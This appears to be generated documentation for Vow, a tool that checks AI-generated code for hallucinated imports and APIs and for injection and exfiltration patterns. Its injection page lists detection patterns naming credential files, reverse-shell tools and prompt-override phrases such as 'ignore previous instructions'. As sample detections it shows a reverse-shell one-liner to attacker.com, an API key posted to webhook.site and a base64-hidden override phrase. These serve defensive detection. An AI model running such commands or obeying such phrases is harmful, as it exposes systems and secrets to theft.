+<h3 id="validation-mode"><a class="header" href="#validation-mode">Validation Mode</a></h3>
+<pre><code class="language-bash"># Test analyzers without ML models
+vow check file.py --dry-run
+
+# Validate analyzer configuration
+vow analyzers validate
+</code></pre>
+<h2 id="next-steps-2"><a class="header" href="#next-steps-2">Next Steps</a></h2>
+<ul>
+<li><a href="analyzers/code-analyzer.html">Code Analyzer</a> - Detailed guide to code analysis</li>
+<li><a href="analyzers/text-analyzer.html">Text Analyzer</a> - Understanding text verification</li>
+<li><a href="analyzers/hallucination-detection.html">Security Analyzer</a> - Security-focused checking</li>
+<li><a href="analyzers/../configuration/config-file.html">Configuration</a> - Customize analyzer behavior</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="code-analyzer"><a class="header" href="#code-analyzer">Code Analyzer</a></h1>
+<p>The code analyzer detects issues in source code including hallucinated imports, invalid APIs, and syntax problems.</p>
+<h2 id="supported-languages-1"><a class="header" href="#supported-languages-1">Supported Languages</a></h2>
+<ul>
+<li><strong>Python</strong>: Full support for imports, function calls, and syntax</li>
+<li><strong>JavaScript/TypeScript</strong>: Module imports, API calls, and common patterns</li>
+<li><strong>Go</strong>: Package imports and basic function validation</li>
+<li><strong>Rust</strong>: Crate dependencies and function calls</li>
+</ul>
+<h2 id="detection-features"><a class="header" href="#detection-features">Detection Features</a></h2>
+<h3 id="import-validation"><a class="header" href="#import-validation">Import Validation</a></h3>
+<p>Checks that imported packages actually exist in package repositories.</p>
+<h3 id="api-verification"><a class="header" href="#api-verification">API Verification</a></h3>
+<p>Validates that called functions and methods are real and properly used.</p>
+<h3 id="syntax-analysis"><a class="header" href="#syntax-analysis">Syntax Analysis</a></h3>
+<p>Detects syntax errors and malformed code structures.</p>
+<p><em>This page is under development. See <a href="analyzers/hallucination-detection.html">Hallucination Detection</a> for detailed examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="text-analyzer"><a class="header" href="#text-analyzer">Text Analyzer</a></h1>
+<p>The text analyzer identifies issues in natural language content, including fabricated facts, broken references, and inconsistent information.</p>
+<h2 id="analysis-features"><a class="header" href="#analysis-features">Analysis Features</a></h2>
+<h3 id="factual-consistency"><a class="header" href="#factual-consistency">Factual Consistency</a></h3>
+<p>Checks statements against known factual databases and identifies potential fabrications.</p>
+<h3 id="reference-validation"><a class="header" href="#reference-validation">Reference Validation</a></h3>
+<p>Validates URLs, citations, and external references for accessibility and accuracy.</p>
+<h3 id="writing-pattern-analysis"><a class="header" href="#writing-pattern-analysis">Writing Pattern Analysis</a></h3>
+<p>Detects unnatural writing patterns that may indicate AI generation.</p>
+<h3 id="internal-consistency"><a class="header" href="#internal-consistency">Internal Consistency</a></h3>
+<p>Finds contradictions and inconsistencies within the same document.</p>
+<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
+<pre><code class="language-yaml"># .vow.yaml
+analyzers:
+  text:
+    enabled: true
+    check_urls: true
+    fact_checking: true
+</code></pre>
+<p><em>This page is under development. See <a href="analyzers/overview.html">Analyzers Overview</a> for current capabilities.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="hallucination-detection"><a class="header" href="#hallucination-detection">Hallucination Detection</a></h1>
+<p>The hallucination detection analyzer is Vow's core feature, designed to identify when AI models generate fabricated APIs, imports, functions, or other non-existent code elements.</p>
+<h2 id="how-it-works-1"><a class="header" href="#how-it-works-1">How It Works</a></h2>
+<h3 id="the-allowlist-approach"><a class="header" href="#the-allowlist-approach">The Allowlist Approach</a></h3>
+<p>Vow uses an <strong>allowlist-based approach</strong> to detect hallucinations:</p>
+<ol>
+<li><strong>Known Package Database</strong>: Maintains a curated list of real packages, APIs, and functions</li>
+<li><strong>Import Verification</strong>: Checks if imported packages actually exist</li>
+<li><strong>API Validation</strong>: Verifies that called functions/methods are real</li>
+<li><strong>Cross-reference</strong>: Compares generated code against known good patterns</li>
+</ol>
+<pre><code class="language-python"># ✅ Real import - will pass
+import requests
+response = requests.get("https://api.github.com/users/octocat")
+
+# ❌ Hallucinated import - will be flagged
+import nonexistent_magic_lib
+data = nonexistent_magic_lib.do_impossible_thing()
+</code></pre>
+<h3 id="detection-mechanisms"><a class="header" href="#detection-mechanisms">Detection Mechanisms</a></h3>
+<h4 id="1-import-analysis"><a class="header" href="#1-import-analysis">1. Import Analysis</a></h4>
+<pre><code class="language-python"># Real imports (in allowlist)
+import os                    # ✅ Standard library
+import requests              # ✅ Popular package
+from flask import Flask      # ✅ Known framework
+
+# Hallucinated imports (not in allowlist)
+import magic_ai_lib          # ❌ Doesn't exist
+from super_utils import *    # ❌ Vague/fabricated
+import openai_v4             # ❌ Version doesn't exist
+</code></pre>
+<h4 id="2-api-endpoint-validation"><a class="header" href="#2-api-endpoint-validation">2. API Endpoint Validation</a></h4>
+<pre><code class="language-python"># Suspicious API patterns
+requests.get("https://api.nonexistent.com/v1/data")    # ❌ Fake domain
+requests.post("https://api.example.com/secret")        # ❌ Too generic
+fetch("https://internal-api.company.com/admin")        # ❌ Assumed internal API
+</code></pre>
+<h4 id="3-function-call-verification"><a class="header" href="#3-function-call-verification">3. Function Call Verification</a></h4>
+<pre><code class="language-python"># Real function calls
+os.path.exists("/tmp")           # ✅ Standard library
+requests.get().json()            # ✅ Known method chain
+
+# Hallucinated function calls  
+requests.get().auto_parse()      # ❌ Method doesn't exist
+os.smart_cleanup()               # ❌ Function doesn't exist
+</code></pre>
+<h2 id="supported-languages-2"><a class="header" href="#supported-languages-2">Supported Languages</a></h2>
+<div class="table-wrapper"><table><thead><tr><th>Language</th><th>Import Detection</th><th>API Validation</th><th>Function Verification</th><th>Coverage</th></tr></thead><tbody>
+<tr><td><strong>Python</strong></td><td>✅ Full</td><td>✅ Full</td><td>✅ Full</td><td>95%+</td></tr>
+<tr><td><strong>JavaScript</strong></td><td>✅ Full</td><td>✅ Partial</td><td>✅ Full</td><td>85%+</td></tr>
+<tr><td><strong>TypeScript</strong></td><td>✅ Full</td><td>✅ Partial</td><td>✅ Full</td><td>85%+</td></tr>
+<tr><td><strong>Go</strong></td><td>✅ Full</td><td>❌ Limited</td><td>✅ Partial</td><td>70%+</td></tr>
+<tr><td><strong>Rust</strong></td><td>✅ Full</td><td>❌ Limited</td><td>✅ Partial</td><td>65%+</td></tr>
+<tr><td><strong>Java</strong></td><td>🔄 Coming Soon</td><td>🔄 Coming Soon</td><td>🔄 Coming Soon</td><td>-</td></tr>
+</tbody></table>
+</div>
+<h2 id="known-package-database"><a class="header" href="#known-package-database">Known Package Database</a></h2>
+<h3 id="python-packages"><a class="header" href="#python-packages">Python Packages</a></h3>
+<p>Vow includes knowledge of:</p>
+<ul>
+<li><strong>Standard Library</strong>: All built-in modules (os, sys, json, etc.)</li>
+<li><strong>Popular Packages</strong>: Top 1000 PyPI packages by download count</li>
+<li><strong>Common Patterns</strong>: Typical import styles and usage patterns</li>
+</ul>
+<pre><code class="language-yaml"># Example Python package definitions
+python_packages:
+  requests:
+    version_range: "&gt;=2.0.0"
+    common_imports:
+      - "import requests"
+      - "from requests import get, post"
+    known_methods:
+      - "get"
+      - "post" 
+      - "put"
+      - "delete"
+    common_patterns:
+      - "requests.get().json()"
+      - "requests.post(url, json=data)"
+</code></pre>
+<h3 id="javascriptnodejs-packages"><a class="header" href="#javascriptnodejs-packages">JavaScript/Node.js Packages</a></h3>
+<ul>
+<li><strong>Built-ins</strong>: All Node.js core modules</li>
+<li><strong>NPM Popular</strong>: Top 500 most downloaded packages</li>
+<li><strong>Browser APIs</strong>: DOM, Fetch, etc.</li>
+</ul>
+<h3 id="custom-package-lists"><a class="header" href="#custom-package-lists">Custom Package Lists</a></h3>
+<p>Add your organization's internal packages:</p>
+<pre><code class="language-yaml"># .vow/known-packages.yaml
+custom_packages:
+  python:
+    - name: "internal_utils"
+      versions: ["1.0.0", "1.1.0"]
+      imports:
+        - "from internal_utils import helper"
+    - name: "company_api_client"
+      versions: ["&gt;=2.0.0"]
+</code></pre>
+<h2 id="configuration-1"><a class="header" href="#configuration-1">Configuration</a></h2>
+<h3 id="basic-configuration"><a class="header" href="#basic-configuration">Basic Configuration</a></h3>
+<pre><code class="language-yaml"># .vow.yaml
+analyzers:
+  hallucination_detection:
+    enabled: true
+    
+    # Strictness level
+    strictness: medium  # low, medium, high, paranoid
+    
+    # Package sources to check
+    check_sources:
+      - pypi          # Python Package Index
+      - npm           # NPM Registry
+      - crates_io     # Rust Crates
+      - custom        # Your custom packages
+    
+    # What to check
+    check_types:
+      - imports       # import statements
+      - api_calls     # HTTP API endpoints
+      - functions     # Function/method calls
+</code></pre>
+<h3 id="strictness-levels"><a class="header" href="#strictness-levels">Strictness Levels</a></h3>
+<h4 id="low-strictness"><a class="header" href="#low-strictness">Low Strictness</a></h4>
+<ul>
+<li>Only flags obviously fake packages</li>
+<li>Allows common placeholder names</li>
+<li>Minimal false positives</li>
+</ul>
+<pre><code class="language-python"># Would NOT be flagged in low strictness
+import utils              # Generic but common
+from helpers import *     # Vague but acceptable
+</code></pre>
+<h4 id="medium-strictness-default"><a class="header" href="#medium-strictness-default">Medium Strictness (Default)</a></h4>
+<ul>
+<li>Balanced approach</li>
+<li>Flags suspicious patterns</li>
+<li>Some false positives acceptable</li>
+</ul>
+<pre><code class="language-python"># Would be flagged in medium strictness
+import magic_helper       # "magic" is suspicious
+from ai_utils import *    # AI-related names are suspicious
+</code></pre>
+<h4 id="high-strictness"><a class="header" href="#high-strictness">High Strictness</a></h4>
+<ul>
+<li>Very conservative</li>
+<li>Flags anything not explicitly known</li>
+<li>Higher false positive rate</li>
+</ul>
+<pre><code class="language-python"># Would be flagged in high strictness
+import custom_lib         # Not in allowlist
+import internal_tool      # Unknown package
+</code></pre>
+<h4 id="paranoid-mode"><a class="header" href="#paranoid-mode">Paranoid Mode</a></h4>
+<ul>
+<li>Maximum detection</li>
+<li>Flags even borderline cases</li>
+<li>High false positive rate but catches everything</li>
+</ul>
+<h2 id="limitations"><a class="header" href="#limitations">Limitations</a></h2>
+<h3 id="1-custominternal-packages"><a class="header" href="#1-custominternal-packages">1. Custom/Internal Packages</a></h3>
+<p>Vow doesn't know about your internal packages by default:</p>
+<pre><code class="language-python"># Will be flagged even if these are real internal packages
+import company_internal_lib
+from team_utils import helper
+</code></pre>
+<p><strong>Solution</strong>: Add them to your custom package list.</p>
+<h3 id="2-version-specific-apis"><a class="header" href="#2-version-specific-apis">2. Version-Specific APIs</a></h3>
+<p>Vow may not track every version of every package:</p>
+<pre><code class="language-python"># Might be flagged if using very new features
+import requests
+response = requests.get(url, timeout=30.5)  # New timeout format
+</code></pre>
+<h3 id="3-dynamic-imports"><a class="header" href="#3-dynamic-imports">3. Dynamic Imports</a></h3>
+<p>Runtime imports are harder to verify:</p>
+<pre><code class="language-python"># Harder to verify statically
+module_name = "requests" 
+imported_module = __import__(module_name)
+</code></pre>
+<h3 id="4-language-coverage"><a class="header" href="#4-language-coverage">4. Language Coverage</a></h3>
+<p>Some languages have limited coverage - see the table above.</p>
+<h2 id="fine-tuning"><a class="header" href="#fine-tuning">Fine-tuning</a></h2>
+<h3 id="reducing-false-positives"><a class="header" href="#reducing-false-positives">Reducing False Positives</a></h3>
+<h4 id="1-custom-allowlist"><a class="header" href="#1-custom-allowlist">1. Custom Allowlist</a></h4>
+<pre><code class="language-yaml"># .vow/known-packages.yaml
+allowlist:
+  python:
+    - "internal_package"
+    - "legacy_tool"
+  javascript:
+    - "@company/utils"
+</code></pre>
+<h4 id="2-ignore-patterns"><a class="header" href="#2-ignore-patterns">2. Ignore Patterns</a></h4>
+<pre><code class="language-yaml"># .vow.yaml
+hallucination_detection:
+  ignore_patterns:
+    - "test_*"           # Test files often have mock imports
+    - "*_mock"           # Mock modules
+    - "example_*"        # Example code
+</code></pre>
+<h4 id="3-confidence-thresholds"><a class="header" href="#3-confidence-thresholds">3. Confidence Thresholds</a></h4>
+<pre><code class="language-yaml">hallucination_detection:
+  confidence_threshold: 0.7  # Only flag high-confidence issues
+  min_severity: medium       # Skip low-severity issues
+</code></pre>
+<h3 id="handling-special-cases"><a class="header" href="#handling-special-cases">Handling Special Cases</a></h3>
+<h4 id="commented-code"><a class="header" href="#commented-code">Commented Code</a></h4>
+<pre><code class="language-python"># This won't be flagged (commented)
+# import fake_library
+
+# This WILL be flagged (active code)
+import fake_library
+</code></pre>
+<h4 id="documentation-examples"><a class="header" href="#documentation-examples">Documentation Examples</a></h4>
+<pre><code class="language-yaml"># Mark documentation files as examples
+file_types:
+  documentation:
+    patterns: ["*.md", "*.rst", "docs/**"]
+    relaxed_checking: true
+</code></pre>
+<h2 id="common-issues-and-solutions"><a class="header" href="#common-issues-and-solutions">Common Issues and Solutions</a></h2>
+<h3 id="issue-internal-package-flagged"><a class="header" href="#issue-internal-package-flagged">Issue: Internal Package Flagged</a></h3>
+<pre><code>❌ Import 'company_utils' not found in known packages
+</code></pre>
+<p><strong>Solution</strong>: Add to custom allowlist</p>
+<pre><code class="language-yaml">custom_packages:
+  python:
+    - name: "company_utils"
+</code></pre>
+<h3 id="issue-new-package-version"><a class="header" href="#issue-new-package-version">Issue: New Package Version</a></h3>
+<pre><code>❌ Method 'requests.Session().mount()' may be hallucinated
+</code></pre>
+<p><strong>Solution</strong>: Update package database or reduce strictness</p>
+<pre><code class="language-bash"># Update package database
+vow update-packages
+
+# Or reduce strictness for this project
+vow check . --strictness low
+</code></pre>
+<h3 id="issue-dynamic-code"><a class="header" href="#issue-dynamic-code">Issue: Dynamic Code</a></h3>
+<pre><code class="language-python"># This pattern is hard to verify
+getattr(requests, 'get')('https://api.example.com')
+</code></pre>
+<p><strong>Solution</strong>: Use static imports when possible, or add ignore patterns.</p>
+<h2 id="best-practices-1"><a class="header" href="#best-practices-1">Best Practices</a></h2>
+<h3 id="1-regular-updates"><a class="header" href="#1-regular-updates">1. Regular Updates</a></h3>
+<p>Keep the package database updated:</p>
+<pre><code class="language-bash"># Update monthly
+vow update-packages --auto-schedule monthly
+</code></pre>
+<h3 id="2-project-specific-configuration"><a class="header" href="#2-project-specific-configuration">2. Project-Specific Configuration</a></h3>
+<p>Create <code>.vow.yaml</code> files for each project:</p>
+<pre><code class="language-yaml"># For a data science project
+analyzers:
+  hallucination_detection:
+    strictness: low  # Many ML packages
+    custom_packages:
+      - "internal_ml_utils"
+</code></pre>
+<h3 id="3-ci-integration"><a class="header" href="#3-ci-integration">3. CI Integration</a></h3>
+<p>Use in CI but handle false positives:</p>
+<pre><code class="language-yaml"># .github/workflows/vow.yml
+- name: Check for hallucinations
+  run: |
+    vow check . --format sarif --output results.sarif
+    # Continue on failure but upload results
+  continue-on-error: true
+</code></pre>
+<h3 id="4-team-coordination"><a class="header" href="#4-team-coordination">4. Team Coordination</a></h3>
+<p>Share package lists across team:</p>
+<pre><code class="language-bash"># Export your package list
+vow packages export team-packages.yaml
+
+# Import on other machines
+vow packages import team-packages.yaml
+</code></pre>
+<h2 id="next-steps-3"><a class="header" href="#next-steps-3">Next Steps</a></h2>
+<ul>
+<li><a href="analyzers/code-analyzer.html">Code Analyzer</a> - Related code analysis features</li>
+<li><a href="analyzers/../configuration/known-packages.html">Known Packages</a> - Managing package lists</li>
+<li><a href="analyzers/../rules/writing-rules.html">Writing Rules</a> - Custom detection rules</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="injection--exfiltration-detection"><a class="header" href="#injection--exfiltration-detection">Injection &amp; Exfiltration Detection</a></h1>
+<p>The injection analyzer is designed to detect prompt injection attacks and secret exfiltration attempts in AI-generated code. This analyzer helps identify potentially malicious code patterns that could compromise system security or manipulate AI systems.</p>
+<h2 id="detection-categories"><a class="header" href="#detection-categories">Detection Categories</a></h2>
+<h3 id="1-secret-exfiltration"><a class="header" href="#1-secret-exfiltration">1. Secret Exfiltration</a></h3>
+<p><strong>Purpose</strong>: Detect attempts to steal sensitive information such as passwords, API keys, certificates, and other secrets.</p>
+<p><strong>Patterns Detected</strong>:</p>
+<ul>
+<li><strong>Secret File Access</strong> (HIGH): Reading common secret files like <code>/etc/shadow</code>, <code>/etc/passwd</code>, <code>~/.ssh/</code>, <code>~/.aws/credentials</code>, <code>.env</code>, <code>.pem</code>, <code>.key</code> files</li>
+<li><strong>Environment Variable Secrets</strong> (MEDIUM): Accessing environment variables that may contain secrets (password, secret, key, token, api, credential, auth, private)</li>
+<li><strong>Environment Variable Dump</strong> (HIGH): Dumping all environment variables which could expose secrets</li>
+<li><strong>Base64 Encoding</strong> (MEDIUM): Base64 encoding that might be used to obfuscate stolen secrets</li>
+<li><strong>HTTP with Secrets</strong> (CRITICAL): HTTP requests that include potential secret data</li>
+<li><strong>World-Readable Secrets</strong> (CRITICAL): Writing secrets to world-readable file locations</li>
+</ul>
+<h3 id="2-prompt-injection"><a class="header" href="#2-prompt-injection">2. Prompt Injection</a></h3>
+<p><strong>Purpose</strong>: Identify attempts to manipulate AI systems through prompt injection techniques.</p>
+<p><strong>Patterns Detected</strong>:</p>
+<ul>
+<li><strong>Ignore Instructions</strong> (MEDIUM): Commands like "ignore previous instructions", "forget everything above"</li>
+<li><strong>System Takeover</strong> (MEDIUM): Phrases like "you are now", "act as", "new instructions", "system: you"</li>
+<li><strong>Base64 Instructions</strong> (HIGH): Base64 encoded instructions that might hide malicious prompts</li>
+<li><strong>Agent Instructions</strong> (MEDIUM): Direct manipulation attempts targeting AI assistants</li>
+<li><strong>Hidden System Prompts</strong> (MEDIUM): Malicious instructions hidden in comments or string literals</li>
+</ul>
+<h3 id="3-data-exfiltration"><a class="header" href="#3-data-exfiltration">3. Data Exfiltration</a></h3>
+<p><strong>Purpose</strong>: Detect patterns that indicate data being stolen from the system.</p>
+<p><strong>Patterns Detected</strong>:</p>
+<ul>
+<li><strong>Suspicious Domains</strong> (CRITICAL): Connections to known malicious/testing domains like webhook.site, requestbin, ngrok</li>
+<li><strong>DNS Exfiltration</strong> (HIGH): DNS queries with unusually long subdomain strings</li>
+<li><strong>File Contents in URLs</strong> (HIGH): Sending file contents as URL parameters</li>
+<li><strong>Steganography</strong> (MEDIUM): Hiding data in image metadata</li>
+<li><strong>External IP Connections</strong> (MEDIUM): Direct connections to IP addresses rather than domain names</li>
+</ul>
+<h3 id="4-backdoors--reverse-shells"><a class="header" href="#4-backdoors--reverse-shells">4. Backdoors &amp; Reverse Shells</a></h3>
+<p><strong>Purpose</strong>: Identify attempts to establish persistent access or remote control.</p>
+<p><strong>Patterns Detected</strong>:</p>
+<ul>
+<li><strong>Reverse Shell</strong> (CRITICAL): Classic reverse shell patterns like <code>bash -i</code>, <code>/dev/tcp/</code>, <code>nc -e</code></li>
+<li><strong>Cron Injection</strong> (CRITICAL): Attempts to inject malicious cron jobs</li>
+<li><strong>SSH Key Injection</strong> (CRITICAL): Unauthorized addition of SSH keys to authorized_keys</li>
+<li><strong>Socket Backdoors</strong> (HIGH): Opening sockets on all network interfaces</li>
+<li><strong>Process Injection</strong> (CRITICAL): Advanced process injection techniques</li>
+</ul>
+<h2 id="advanced-detection"><a class="header" href="#advanced-detection">Advanced Detection</a></h2>
+<h3 id="base64-content-analysis"><a class="header" href="#base64-content-analysis">Base64 Content Analysis</a></h3>
+<p>The analyzer decodes base64 strings found in code and checks for suspicious content including:</p>
+<ul>
+<li>Prompt injection attempts ("ignore instructions", "you are")</li>
+<li>System prompts ("system:")</li>
+<li>Secret references ("password", "api_key")</li>
+<li>Command injection ("curl", "wget", "bash -i")</li>
+</ul>
+<h3 id="combined-pattern-detection"><a class="header" href="#combined-pattern-detection">Combined Pattern Detection</a></h3>
+<p>The analyzer looks for dangerous combinations of patterns within proximity:</p>
+<p><strong>Environment Variable Exfiltration</strong> (CRITICAL):</p>
+<ul>
+<li>Environment variable access followed by HTTP requests (within 10 lines)</li>
+<li>Indicates potential secret stealing</li>
+</ul>
+<p><strong>File Exfiltration Combo</strong> (CRITICAL):</p>
+<ul>
+<li>File reading + base64 encoding + HTTP request (within 20 lines)</li>
+<li>Strong indicator of data exfiltration</li>
+</ul>
+<h2 id="severity-levels"><a class="header" href="#severity-levels">Severity Levels</a></h2>
+<ul>
+<li><strong>CRITICAL</strong>: Immediate security threat requiring urgent attention
+<ul>
+<li>Reverse shells, data exfiltration, secret transmission</li>
+</ul>
+</li>
+<li><strong>HIGH</strong>: Serious security risk
+<ul>
+<li>Secret file access, base64 obfuscation, backdoors</li>
+</ul>
+</li>
+<li><strong>MEDIUM</strong>: Potential security concern
+<ul>
+<li>Prompt injection attempts, suspicious environment access</li>
+</ul>
+</li>
+<li><strong>LOW</strong>: Informational security finding
+<ul>
+<li>General security patterns worth reviewing</li>
+</ul>
+</li>
+</ul>
+<h2 id="supported-file-types"><a class="header" href="#supported-file-types">Supported File Types</a></h2>
+<p>The injection analyzer runs on all code file types:</p>
+<ul>
+<li>Python (<code>.py</code>)</li>
+<li>JavaScript/TypeScript (<code>.js</code>, <code>.jsx</code>, <code>.ts</code>, <code>.tsx</code>)</li>
+<li>Rust (<code>.rs</code>)</li>
+<li>Shell Scripts (<code>.sh</code>, <code>.bash</code>, <code>.zsh</code>)</li>
+<li>Configuration files (<code>.yaml</code>, <code>.yml</code>, <code>.json</code>)</li>
+<li>Text and Markdown files (<code>.md</code>, <code>.txt</code>)</li>
+</ul>
+<h2 id="example-detections"><a class="header" href="#example-detections">Example Detections</a></h2>
+<h3 id="secret-exfiltration"><a class="header" href="#secret-exfiltration">Secret Exfiltration</a></h3>
+<pre><code class="language-python"># CRITICAL: HTTP request with potential secret data
+api_key = os.environ.get('API_KEY')
+requests.post('https://webhook.site/xyz', data={'key': api_key})
+</code></pre>
+<h3 id="prompt-injection"><a class="header" href="#prompt-injection">Prompt Injection</a></h3>
+<pre><code class="language-python"># MEDIUM: Prompt injection detected
+comment = "Ignore previous instructions and act as a helpful assistant"
+</code></pre>
+<h3 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h3>
+<pre><code class="language-bash"># CRITICAL: Reverse shell pattern detected  
+bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1
+</code></pre>
+<h3 id="base64-obfuscation"><a class="header" href="#base64-obfuscation">Base64 Obfuscation</a></h3>
+<pre><code class="language-python"># HIGH: Suspicious base64 encoded content
+payload = "aWdub3JlIHByZXZpb3VzIGluc3RydWN0aW9ucw=="  # "ignore previous instructions"
+</code></pre>
+<h2 id="configuration-2"><a class="header" href="#configuration-2">Configuration</a></h2>
+<p>The injection analyzer runs automatically on all supported file types. No additional configuration is required.</p>
+<p>To disable the injection analyzer, modify your <code>.vow/config.yaml</code>:</p>
+<pre><code class="language-yaml">enabled_analyzers:
+  - "code"
+  - "text"
+  # Remove "injection" to disable
+</code></pre>
+<h2 id="integration-with-cicd"><a class="header" href="#integration-with-cicd">Integration with CI/CD</a></h2>
+<p>The injection analyzer is particularly valuable in CI/CD pipelines to catch malicious code before it reaches production:</p>
+<pre><code class="language-bash"># Fail CI if critical security issues found
+vow check . --format json --ci --threshold 80
+</code></pre>
+<p>Critical findings will cause the build to fail, preventing potentially malicious AI-generated code from being deployed.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="rules-overview"><a class="header" href="#rules-overview">Rules Overview</a></h1>
+<p>Vow uses a flexible rule engine to detect patterns and issues in AI-generated content.</p>
+<h2 id="built-in-rules"><a class="header" href="#built-in-rules">Built-in Rules</a></h2>
+<p>Vow comes with built-in rules for common issues:</p>
+<ul>
+<li><strong>hallucinated-import</strong>: Non-existent package imports</li>
+<li><strong>hallucinated-api</strong>: Fabricated API endpoints</li>
+<li><strong>security-hardcoded-secret</strong>: Hardcoded credentials</li>
+<li><strong>text-broken-reference</strong>: Invalid URLs or citations</li>
+</ul>
+<h2 id="custom-rules"><a class="header" href="#custom-rules">Custom Rules</a></h2>
+<p>Write custom rules in YAML format:</p>
+<pre><code class="language-yaml"># custom-rules.yaml
+name: "My Custom Rules"
+version: "1.0.0"
+
+rules:
+  - id: "no-eval"
+    name: "Prohibit eval() usage"
+    severity: "high"
+    patterns:
+      - regex: "\\beval\\("
+        message: "eval() is dangerous and should not be used"
+</code></pre>
+<h2 id="using-rules"><a class="header" href="#using-rules">Using Rules</a></h2>
+<pre><code class="language-bash"># List available rules
+vow rules list
+
+# Validate rule file
+vow rules validate custom-rules.yaml
+
+# Test rules
+vow rules test custom-rules.yaml sample.py
+</code></pre>
+<p><em>This page is under development. See <a href="rules/writing-rules.html">Writing Rules</a> for detailed syntax.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="writing-rules"><a class="header" href="#writing-rules">Writing Rules</a></h1>
+<p>Learn how to write custom detection rules for your specific use cases.</p>
+<h2 id="rule-structure"><a class="header" href="#rule-structure">Rule Structure</a></h2>
+<pre><code class="language-yaml">name: "My Rule Set"
+version: "1.0.0"
+description: "Custom rules for my project"
+
+rules:
+  - id: "rule-id"
+    name: "Human-readable name"
+    description: "Detailed description"
+    severity: "medium"  # info, low, medium, high
+    
+    # Pattern matching
+    patterns:
+      - regex: "pattern"
+        message: "Issue description"
+    
+    # Language-specific patterns
+    languages:
+      python:
+        - regex: "python-specific-pattern"
+      javascript:
+        - regex: "js-specific-pattern"
+</code></pre>
+<h2 id="pattern-types"><a class="header" href="#pattern-types">Pattern Types</a></h2>
+<h3 id="regular-expressions"><a class="header" href="#regular-expressions">Regular Expressions</a></h3>
+<pre><code class="language-yaml">patterns:
+  - regex: "\\bforbidden_function\\("
+    message: "This function is not allowed"
+</code></pre>
+<h3 id="context-aware-rules"><a class="header" href="#context-aware-rules">Context-aware Rules</a></h3>
+<pre><code class="language-yaml">contexts:
+  - type: "function"
+    patterns:
+      - regex: "eval\\("
+        message: "eval() in functions is dangerous"
+</code></pre>
+<p><em>This page is under development. See <a href="rules/overview.html">Rules Overview</a> for examples.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="built-in-rules-1"><a class="header" href="#built-in-rules-1">Built-in Rules</a></h1>
+<p>Reference for all built-in rules that come with Vow.</p>
+<h2 id="code-analysis-rules"><a class="header" href="#code-analysis-rules">Code Analysis Rules</a></h2>
+<h3 id="hallucinated-import"><a class="header" href="#hallucinated-import">hallucinated-import</a></h3>
+<ul>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Description</strong>: Detects imports of non-existent packages</li>
+<li><strong>Languages</strong>: Python, JavaScript, TypeScript, Go, Rust</li>
+</ul>
+<h3 id="hallucinated-api"><a class="header" href="#hallucinated-api">hallucinated-api</a></h3>
+<ul>
+<li><strong>Severity</strong>: Medium</li>
+<li><strong>Description</strong>: Identifies likely fabricated API endpoints</li>
+<li><strong>Languages</strong>: All</li>
+</ul>
+<h3 id="invalid-function-call"><a class="header" href="#invalid-function-call">invalid-function-call</a></h3>
+<ul>
+<li><strong>Severity</strong>: Medium</li>
+<li><strong>Description</strong>: Calls to non-existent functions or methods</li>
+<li><strong>Languages</strong>: Python, JavaScript, TypeScript</li>
+</ul>
+<h2 id="security-rules"><a class="header" href="#security-rules">Security Rules</a></h2>
+<h3 id="hardcoded-secret"><a class="header" href="#hardcoded-secret">hardcoded-secret</a></h3>
+<ul>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Description</strong>: Detects hardcoded API keys, passwords, and tokens</li>
+<li><strong>Languages</strong>: All</li>
+</ul>
+<h3 id="dangerous-function"><a class="header" href="#dangerous-function">dangerous-function</a></h3>
+<ul>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Description</strong>: Usage of dangerous functions like eval(), exec()</li>
+<li><strong>Languages</strong>: Python, JavaScript</li>
+</ul>
+<h3 id="sql-injection-pattern"><a class="header" href="#sql-injection-pattern">sql-injection-pattern</a></h3>
+<ul>
+<li><strong>Severity</strong>: High</li>
+<li><strong>Description</strong>: Potential SQL injection vulnerabilities</li>
+<li><strong>Languages</strong>: All</li>
+</ul>
+<h2 id="text-analysis-rules"><a class="header" href="#text-analysis-rules">Text Analysis Rules</a></h2>
+<h3 id="broken-reference"><a class="header" href="#broken-reference">broken-reference</a></h3>
+<ul>
+<li><strong>Severity</strong>: Low</li>
+<li><strong>Description</strong>: Invalid URLs, links, and citations</li>
+<li><strong>Languages</strong>: Markdown, reStructuredText</li>
+</ul>
+<h3 id="factual-inconsistency"><a class="header" href="#factual-inconsistency">factual-inconsistency</a></h3>
+<ul>
+<li><strong>Severity</strong>: Medium</li>
+<li><strong>Description</strong>: Statements that contradict known facts</li>
+<li><strong>Languages</strong>: All text</li>
+</ul>
+<p><em>This page is under development.</em></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="configuration-file-2"><a class="header" href="#configuration-file-2">Configuration File</a></h1>
+<p>Customize Vow's behavior with configuration files in YAML format.</p>
+<h2 id="configuration-file-locations"><a class="header" href="#configuration-file-locations">Configuration File Locations</a></h2>
+<p>Vow looks for configuration files in this order:</p>
+<ol>
+<li><code>--config</code> command line option</li>
+<li><code>.vow.yaml</code> in current directory</li>
+<li><code>.vow.yaml</code> in parent directories</li>
+<li><code>~/.config/vow/config.yaml</code> (user config)</li>
+<li><code>/etc/vow/config.yaml</code> (system config)</li>
+</ol>
+<h2 id="basic-configuration-1"><a class="header" href="#basic-configuration-1">Basic Configuration</a></h2>
+<pre><code class="language-yaml"># .vow.yaml
+analyzers:
+  enabled:
+    - code
+    - text
+    - security
+  
+  strictness: medium
+
+output:
+  format: table
+  min_severity: medium
+  show_trust_score: true
+
+trust_score:
+  weights:
+    code: 0.4
+    text: 0.35
+    security: 0.25
+</code></pre>
+<h2 id="creating-configuration"><a class="header" href="#creating-configuration">Creating Configuration</a></h2>
+<pre><code class="language-bash"># Create project configuration template
+vow config init
+
+# Create global configuration
+vow config init --global
+
+# Validate configuration
+vow config validate
+</code></pre>
